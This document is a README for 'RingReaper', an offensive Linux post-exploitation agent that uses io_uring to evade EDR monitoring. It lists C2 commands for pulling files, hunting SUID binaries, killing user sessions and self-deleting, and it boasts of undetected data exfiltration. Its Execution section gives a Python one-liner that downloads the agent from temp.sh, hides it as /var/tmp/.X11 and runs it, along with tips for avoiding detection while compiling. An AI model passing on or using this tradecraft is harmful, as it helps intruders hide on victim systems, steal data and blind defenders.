# RingReaper

**RingReaper** is a simple post-exploitation agent for Linux designed for those who need to operate stealthily, minimizing the chances of being detected by EDR solutions. The idea behind this project was to leverage **io_uring**, the new asynchronous I/O interface in the Linux kernel, specifically to avoid traditional system calls that most EDRs tend to monitor or even hook.

In practice, RingReaper replaces calls such as `read`, `write`, `recv`, `send`, `connect`, among others, with asynchronous I/O operations (`io_uring_prep_*`), reducing exposure to hooks and event tracing typically collected in a standardized way by security products.

> **NOTE:** Some functions within RingReaper still rely on traditional calls, such as directory reading (`opendir`, `readdir`) or symbolic link resolution (`readlink`), because io_uring **does not yet fully support** these types of operations natively. Even so, during my tests, these calls did not trigger alerts on the tested EDRs, precisely because they fall outside the monitored network I/O paths.

In summary, RingReaper was built to **avoid traditional calls as much as possible**, and even in cases where it had to use them, it demonstrated excellent evasion capabilities, with no alerts or detections from common security agents.


## Command Reference

| Command       | Description                                              | Backend              |
|---------------|----------------------------------------------------------|----------------------|
| `get`         | Look files from the target                           | 100% io_uring        |
| `put`         | Upload files (uses `recv` on the agent side)             | 100% io_uring        |
| `users`       | List logged-in users by reading `utmp`                   | 100% io_uring        |
| `ss` / `netstat` | List TCP connections from `/proc/net/tcp`            | 100% io_uring        |
| `privesc`     | Search for SUID binaries using `statx`                   | 100% io_uring        |
| `ps`          | List processes (uses `opendir`, `readdir`)               | traditional calls + io_uring   |
| `kick`        | Kill `pts` sessions (uses `opendir`, `readdir`, `kill`, `readlink`) | traditional calls + io_uring |
| `me`          | Show PID/TTY (`getpid`, `ttyname`)                       | traditional calls + io_uring   |
| `selfdestruct`| Delete the current binary (uses `readlink`)              | traditional calls + io_uring   |
| `exit`        | Terminate connection and exit                            | 100% io_uring        |
| `help`        | Display help                                             | 100% io_uring        |

In RingReaper, all data traffic, including control commands, uploads, and downloads, must pass through io_uring. This also ensures that the most sensitive operations remain off the radar of hooks and EDR monitoring based on traditional calls.

## About Evasion

RingReaper was designed from the ground up to bypass EDR monitoring. Many security solutions base their detection triggers on intercepting classic syscalls (`read`, `recv`, `send`, `connect`) at the kernel level. Since `io_uring` is relatively new and less integrated into the telemetry pipeline of these products, it often goes unnoticed by most agents, allowing for C2 sessions and data exfiltration without triggering alerts.

Even functions that still rely on older syscalls (such as directory reading) remained discreet enough not to raise alarms.

## Requirements

- Linux kernel 5.1 or higher  
- `liburing` library  
- A compatible C compiler (tested with GCC)  

## Env

Tested **ONLY** on the following kernel versions below;

- 6.8.0-60-generic
- 6.12.25-amd64

## Compilation

```
sudo apt install liburing-dev -y
gcc agent.c -o agent -luring -O2 -s -static
```

## Execution

In testing, I noticed that EDR detected the compilation of `agent.c` by monitoring GCC usage in real time (it's better not to use wget/curl). To bypass this, I compiled the agent statically on my machine, sent the finished binary via `temp.sh` and used Python on the target to download and execute it. This technique worked without warning.

Server (Attack box) : 

- `curl -F "file=agent" https://temp.sh/upload`
- `python3 server.py --ip IP --port 443` 

Agent (Target machine) :

- `python3 -c "import urllib.request,os,subprocess; u=urllib.request.Request('http://temp.sh/xxxx/stealth_agent',method='POST'); d='/var/tmp/.X11'; open(d,'wb').write(urllib.request.urlopen(u).read()); os.chmod(d,0o755); subprocess.Popen([d]);"`


